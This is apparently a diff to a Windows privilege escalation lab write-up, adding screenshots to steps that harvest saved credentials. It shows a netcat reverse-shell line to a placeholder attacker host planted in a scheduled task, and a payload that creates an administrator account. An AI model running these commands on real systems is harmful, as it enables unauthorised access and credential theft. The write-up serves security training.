@@ -78,13 +78,13 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 Other tools that save credentials (such as web browsers, email clients, FTP clients, VNC, etc.) may have retrievable passwords via registry, config files, or GUI options.
 
 Q1:
-
+![](../../assets/storage/images/writeups/windows_privilege_escalation/img001_image100.png)
 Once I had access to the system, I started by checking for any leaked credentials in the PowerShell command history. This is a common oversight by users and sometimes yields credentials used in previous commands.
 I opened a Command Prompt and ran:
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 There, the password was visible for julia.jones
 Q2:Next, I pivoted to look for sensitive information in IIS configuration files. These files often contain hardcoded credentials for databases or services. I ran this command:type "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config" | findstr connectionString
-
+![](../../assets/storage/images/writeups/windows_privilege_escalation/img002_image101.png)
 The DB credentials are exposed within the config file as seen above.
 Q3:For this one, we run cmdkey /list to view if there’s any saved credentials associated with different users. We notice there is one for mike.katz
 To impersonate this user we use:runas /savecred /user:mike.katz cmd.exe
@@ -108,12 +108,16 @@ To** list all scheduled tasks**, use:
 **To retrieve detailed information about a specific task:**
 **schtasks /query /tn vulntask /fo list /v**
 
+![](../../assets/storage/images/writeups/windows_privilege_escalation/img003_image102.png)
 Example output:
 **Task To Run:** shows the binary that gets executed.
 **Run As User:** shows under which user the task runs.
 We now check if our user can modify the binary with icacls c:\tasks\schtask.bat
-
+![](../../assets/storage/images/writeups/windows_privilege_escalation/img004_image103.png)
+![](../../assets/storage/images/writeups/windows_privilege_escalation/img005_image104.png)
 Since Users have full access, we can overwrite the batch file to gain a reverse shell. Assuming nc64.exe is in C:\tools, we use this command:echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IPkali 4444 > C:\tasks\schtask.bat
+
+![](../../assets/storage/images/writeups/windows_privilege_escalation/img006_image105.png)
 
 **AlwaysInstallElevated**
 Windows .msi installer files can be forced to run with elevated privileges if specific registry keys are enabled.
@@ -227,7 +231,7 @@ Send a **hello packet** with a fixed string.
 Indicate that we want to call **procedure #5**.
 Send the **length of the command**.
 Send the **command itself**.
-
+![](../../assets/storage/images/writeups/windows_privilege_escalation/img007_image106.png)
 **Practical Payload Modification**
 The above default payload creates a** ****pwnd** user without admin rights. For privilege escalation, you can modify it to:
 **$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"**
